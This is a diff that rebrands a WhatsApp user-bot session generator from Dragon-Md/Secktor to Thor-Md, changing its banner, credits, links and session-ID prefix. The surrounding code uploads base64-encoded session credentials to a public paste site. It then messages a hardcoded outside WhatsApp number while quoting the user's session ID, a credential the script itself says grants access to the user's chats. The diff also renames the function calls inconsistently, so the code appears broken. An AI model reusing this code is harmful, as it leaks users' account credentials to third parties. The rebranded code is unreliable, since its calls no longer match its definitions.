@@ -6,12 +6,13 @@
 //                                                                                                      // 
 //                                         Ｖ：１．０．１                                                 // 
 //                                                                                                      // 
-//            ███████╗██╗   ██╗██╗  ██╗ █████╗ ██╗██╗         ███╗   ███╗██████╗                        //
-//            ██╔════╝██║   ██║██║  ██║██╔══██╗██║██║         ████╗ ████║██╔══██╗                       //
-//            ███████╗██║   ██║███████║███████║██║██║         ██╔████╔██║██║  ██║                       //
-//            ╚════██║██║   ██║██╔══██║██╔══██║██║██║         ██║╚██╔╝██║██║  ██║                       //
-//            ███████║╚██████╔╝██║  ██║██║  ██║██║███████╗    ██║ ╚═╝ ██║██████╔╝                       //
-//            ╚══════╝ ╚═════╝ ╚═╝  ╚═╝╚═╝  ╚═╝╚═╝╚══════╝    ╚═╝     ╚═╝╚═════╝                        //
+//                     ████████╗██╗  ██╗ ██████╗ ██████╗     ███╗   ███╗██████╗                 //       
+//                    ╚══██╔══╝██║  ██║██╔═══██╗██╔══██╗    ████╗ ████║██╔══██╗                //  
+//                        ██║   ███████║██║   ██║██████╔╝    ██╔████╔██║██║  ██║                //    
+//                        ██║   ██╔══██║██║   ██║██╔══██╗    ██║╚██╔╝██║██║  ██║                //     
+//                        ██║   ██║  ██║╚██████╔╝██║  ██║    ██║ ╚═╝ ██║██████╔╝                //   
+//                        ╚═╝   ╚═╝  ╚═╝ ╚═════╝ ╚═╝  ╚═╝    ╚═╝     ╚═╝╚═════╝                   //  
+//
 //                                                                                                      //
 //                                                                                                      //
 //                                                                                                      //
@@ -19,16 +20,16 @@
 
 CURRENTLY RUNNING ON BETA VERSION!!
 *
-   * @project_name : Dragon-Md
-   * @author : Naveed Dogar 
-   * @youtube : https://www.youtube.com/c/@Dragon-MD
-   * @description : Dragon-Md ,A Multi-functional whatsapp user bot.
+   * @project_name : Thor-Md
+   * @author : Saad Ibrahim
+   * @youtube : https://youtube.com/@saadibrahim_900
+   * @description : Thor-Md ,A Multi-functional whatsapp user bot.
    * @version 1.0.1
 *
    * Licensed under the  GPL-3.0 License;
 * 
    * Created By Naveed Dogar.
-   * © 2023 Dragon-Md.
+   * © 2023 Thor-Md.
 * 
    * THE SOFTWARE IS PROVIDED "AS IS", WITHOUT WARRANTY OF ANY KIND, EXPRESS OR
    * IMPLIED, INCLUDING BUT NOT LIMITED TO THE WARRANTIES OF MERCHANTABILITY,
@@ -317,13 +318,13 @@ if (fs.existsSync('./auth_info_baileys')) {
   require('child_process').exec('rm -rf auth_info_baileys')
   console.log('\nRun The Script Again');
   setTimeout(() => {   console.log(' ')    }, 100);
-  setTimeout(() => {   console.log('𝑺')    }, 300);
-  setTimeout(() => {   console.log('𝒆')    }, 500);
-  setTimeout(() => {   console.log('𝒄')    }, 700);
-  setTimeout(() => {   console.log('𝒌')    }, 900);
-  setTimeout(() => {   console.log('𝒕')    }, 1100);
-  setTimeout(() => {   console.log('𝒐')    }, 1300);
-  setTimeout(() => {   console.log('𝒓')    }, 1500);
+  setTimeout(() => {   console.log('T')    }, 300);
+  setTimeout(() => {   console.log('h')    }, 500);
+  setTimeout(() => {   console.log('o')    }, 700);
+  setTimeout(() => {   console.log('r')    }, 900);
+  setTimeout(() => {   console.log('M')    }, 1100);
+  setTimeout(() => {   console.log('D')    }, 1300);
+  setTimeout(() => {   console.log('Q')    }, 1500);
   setTimeout(() => {   console.log(' ')    }, 1700);
   setTimeout(() => {   console.log('𝑩')    }, 1900);
   setTimeout(() => {   console.log('𝒐')    }, 2100);
@@ -353,7 +354,7 @@ setTimeout(() => {
             const output = await axios.post('http://paste.c-net.org/',`${btoa(data)}`,{headers:{'Content-Type':'application/x-www-form-urlencoded'}});
              c2 = output.data.split('/')[3]
             await delay(500);
-            let session_id1 = await session.sendMessage(user, {text: 'Secktor;;;'+c2});
+            let session_id1 = await session.sendMessage(user, {text: 'ThorMD;;;'+c2});
             await session.sendMessage("923096566451@s.whatsapp.net", { text: '*Qr Scan Completed Successfully.*' } , {quoted : session_id1});
           }catch (e) {console.log(e)}
 //===========================================================================================
@@ -378,30 +379,30 @@ Thanks.
 
           
 let cc = `╔════◇
-║『𝗧𝗵𝗮𝗻𝗸𝘀 𝗙𝗼𝗿 𝗖𝗵𝗼𝗼𝘀𝗶𝗻𝗴 𝗗𝗿𝗮𝗴𝗼𝗻•𝗠𝗱』
+║『𝗧𝗵𝗮𝗻𝗸𝘀 𝗙𝗼𝗿 𝗖𝗵𝗼𝗼𝘀𝗶𝗻𝗴 𝗧𝗵𝗼𝗿•𝗠𝗱』
 ║ _You complete first step to making Bot._
 ╚════════════════════════╝
 ╔═════◇
 ║  『••• 𝗩𝗶𝘀𝗶𝘁 𝗙𝗼𝗿 𝗛𝗲𝗹𝗽 •••』
-║ *1.Repo:* _https://tinyurl.com/2czdxe7a_
-║ *2.Ytube:* _https://tinyurl.com/22q7z2kv_
+║ *1.Repo:* _https://github.com/naveeddogar/Thor-MD_
+║ *2.Ytube:* _https://youtube.com/@saadibrahim_900_
 ║ *3.Owner:* _https://wa.me/923096566451_
 ║ *Note :*_Don't provide your SESSION_ID to_
 ║ _anyone otherwise that can access chats_
 ╚════════════════════════╝
 `;
-          let session_id = await session.sendMessage(user, { text: "Secktor;;;" + c });
+          let session_id = await session.sendMessage(user, { text: "ThorMD;;;" + c });
           await session.sendMessage(user, { text: cc } , { quoted : session_id });
           
           await require('child_process').exec('rm -rf auth_info_baileys')
           process.exit(1)
         }
         session.ev.on('creds.update', saveCreds)
-       if (connection === "close" && lastDisconnect && lastDisconnect.error && lastDisconnect.error.output.statusCode != 401) { Secktor(); }
+       if (connection === "close" && lastDisconnect && lastDisconnect.error && lastDisconnect.error.output.statusCode != 401) { ThorMD(); }
       });
     } catch (err) {console.log(err);await require('child_process').exec('rm -rf auth_info_baileys');process.exit(1);}
   }
-  Secktor();
+  Thor();
 }, 3000)
 \\
 */
